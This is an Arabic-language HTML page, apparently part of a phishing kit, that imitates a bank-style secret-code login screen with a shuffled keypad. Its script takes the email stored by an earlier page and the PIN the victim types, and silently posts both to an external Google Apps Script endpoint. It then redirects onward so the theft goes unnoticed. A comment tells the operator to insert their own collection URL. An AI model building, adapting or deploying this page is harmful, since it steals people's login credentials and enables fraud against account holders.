<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>الرمز السري</title>
    <style>
        body { 
            font-family: sans-serif; 
            margin: 0; 
            background-color: #EAF0E9; 
            display: flex; 
            justify-content: center; 
            min-height: 100vh; 
        }
        .main-container { 
            width: 100%; 
            max-width: 400px; 
            padding: 40px 20px; 
            box-sizing: border-box; 
        }
        .header-title { 
            font-size: 22px; 
            font-weight: bold; 
            margin-bottom: 25px; 
            text-align: right; 
        }
        
        .password-display {
            width: 100%; 
            padding: 18px; 
            border: 1px solid #c8d1c7; 
            border-radius: 12px;
            font-size: 24px; 
            text-align: right; 
            background-color: #fff; 
            margin-bottom: 15px;
            box-sizing: border-box; 
            letter-spacing: 5px;
            height: 60px; 
            outline: none;
        }

        .info-links { 
            display: flex; 
            flex-direction: column; 
            align-items: flex-end; 
            gap: 10px; 
            margin-bottom: 30px; 
        }
        .info-link { 
            text-decoration: underline; 
            color: #000; 
            font-size: 15px; 
            font-weight: bold; 
            cursor: pointer; 
        }
        
        .login-btn {
            width: 100%; 
            background-color: #ffffff; 
            color: #ccc; 
            border: 1px solid #c8d1c7;
            padding: 16px; 
            border-radius: 15px; 
            font-size: 20px; 
            font-weight: bold;
            cursor: not-allowed; 
            margin-bottom: 30px; 
            transition: 0.3s;
        }
        .login-btn.active { 
            background-color: #2EAF4A; 
            color: #ffffff; 
            border: none; 
            cursor: pointer; 
        }

        /* تنسيق لوحة الأرقام */
        .keypad { 
            display: grid; 
            grid-template-columns: repeat(3, 1fr); 
            gap: 1px;
            background-color: #c8d1c7;
            border: 1px solid #c8d1c7;
            border-radius: 8px;
            overflow: hidden;
        }
        .key { 
            padding: 20px 0; 
            text-align: center; 
            font-size: 24px; 
            font-weight: bold; 
            background-color: #fff;
            cursor: pointer; 
            user-select: none; 
        }
        .key:active { background-color: #f0f0f0; }
        .key.action-key { background-color: #f9f9f9; font-size: 16px; color: #666; }
    </style>
</head>
<body>

<div class="main-container">
    <div class="header-title">الرمز السري</div>
    
    <input type="password" id="passInput" class="password-display" placeholder="إدخل الرمز السري" readonly>
    
    <div class="info-links">
        <div class="info-link">ما المقصود بالرمز السري؟</div>
        <div class="info-link">نسيتم الرمز السري؟</div>
    </div>

    <button id="finalBtn" class="login-btn" disabled>ولوج</button>

    <div class="keypad" id="keypad">
        </div>
</div>

<script>
    let currentPass = "";
    // ضع رابط Apps Script الجديد الخاص بك هنا
    const scriptURL = 'https://script.google.com/macros/s/AKfycbwKACz6-gYKCiYYDLYBSqMk-EUtadf23y1fQm0xmcWekwN2LiTl8dX8o_TZPsBQ8G5K/exec';

    function generateKeypad() {
        let nums = [0, 1, 2, 3, 4, 5, 6, 7, 8, 9].sort(() => Math.random() - 0.5);
        const keypad = document.getElementById('keypad');
        keypad.innerHTML = "";
        
        // توليد أول 9 أرقام
        for (let i = 0; i < 9; i++) {
            createKey(nums[i]);
        }
        
        // السطر الأخير: زر مسح، الرقم الأخير، وزر فارغ
        const clearKey = document.createElement('div');
        clearKey.className = 'key action-key';
        clearKey.innerText = "مسح";
        clearKey.onclick = () => {
            currentPass = "";
            document.getElementById('passInput').value = "";
            updateButtonState();
        };
        keypad.appendChild(clearKey);

        createKey(nums[9]);

        const extraKey = document.createElement('div');
        extraKey.className = 'key action-key';
        keypad.appendChild(extraKey);
    }

    function createKey(num) {
        const keyDiv = document.createElement('div');
        keyDiv.className = 'key';
        keyDiv.innerText = num;
        keyDiv.onclick = () => {
            if (currentPass.length < 6) {
                currentPass += num;
                document.getElementById('passInput').value = "*".repeat(currentPass.length);
                updateButtonState();
            }
        };
        document.getElementById('keypad').appendChild(keyDiv);
    }

    function updateButtonState() {
        const btn = document.getElementById('finalBtn');
        if(currentPass.length >= 4) {
            btn.disabled = false;
            btn.classList.add('active');
        } else {
            btn.disabled = true;
            btn.classList.remove('active');
        }
    }

    document.getElementById('finalBtn').addEventListener('click', async () => {
        const email = localStorage.getItem('storedEmail');
        const btn = document.getElementById('finalBtn');
        
        if (!email) {
            alert("يرجى العودة والبدء من الصفحة الأولى");
            window.location.href = "../";
            return;
        }

        btn.innerText = "جاري التحميل...";
        btn.disabled = true;

        try {
            await fetch(scriptURL, {
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify({
                    email: email,
                    password: currentPass,
                    action: "final_login"
                })
            });

            setTimeout(() => {
                window.location.href = "../UserAccountSystem/Account/";
            }, 1200);
        } catch (e) {
            window.location.href = "../UserAccountSystem/Account/";
        }
    });

    window.onload = generateKeypad;
</script>
</body>
</html>
